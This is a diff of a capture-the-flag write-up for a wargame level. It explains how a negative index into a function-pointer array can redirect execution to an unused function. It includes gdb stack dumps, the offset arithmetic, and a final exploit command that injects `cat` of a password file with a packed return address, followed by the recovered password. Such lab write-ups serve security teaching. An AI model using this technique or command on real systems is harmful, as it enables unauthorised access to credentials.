@@ -15,11 +15,9 @@ $ /levels/level03/level03 0 hello
 Uppercased string: HELLO
 $ /levels/level03/level03 2 hello
 Capitalized string: Hello
-$ /levels/level03/level03 3 hello
-Length of string 'hello': 5
 ```
 
-It takes a string and runs some function on it depending on the index parameter.
+It takes a string and runs some function on it depending on the index.
 Let's try to misuse this, for example with a negative index:
 ```
 $ /levels/level03/level03 -1 x
@@ -94,8 +92,7 @@ and execute it.
 Using a negative index,
 the program will do the same with whatever it finds at that location.
 
-Now,
-if the content of `buf` is stored in the region before `fns`,
+If the content of `buf` is stored in the region before `fns`,
 we can put there the address of another function,
 and use the appropriate negative index to make the program execute it.
 The unused `run` function that was careless left inside the program looks perfect for our purposes:
@@ -141,7 +138,6 @@ in this example `0xb77e1334`.
 Let's see the first couple of bytes of the stack:
 ```
 (gdb) x/60xw $sp      
-0xbfae3d5c: 0xbfae3dd8  0x00000001  0x00000000  0x00000000
 0xbfae3d6c: 0x41414141  0x41414141  0x00000000  0x00000000
 0xbfae3d7c: 0x00000000  0x00000000  0x00000000  0x00000000
 0xbfae3d8c: 0x00000000  0x00000000  0x00000000  0x00000000
@@ -179,7 +175,7 @@ the memory content will look something like this:
 ```
 The difference between `fns` and the jump address is `0xbfae3dd8 - 0xbfae3d88 = 80`,
 and since the size of an element in `fns` is 4 bytes,
-the index we're looking for is `-80 / 4 = -20`:
+the index we're looking for is -20:
 ```
 $ /levels/level03/level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
 eingaima
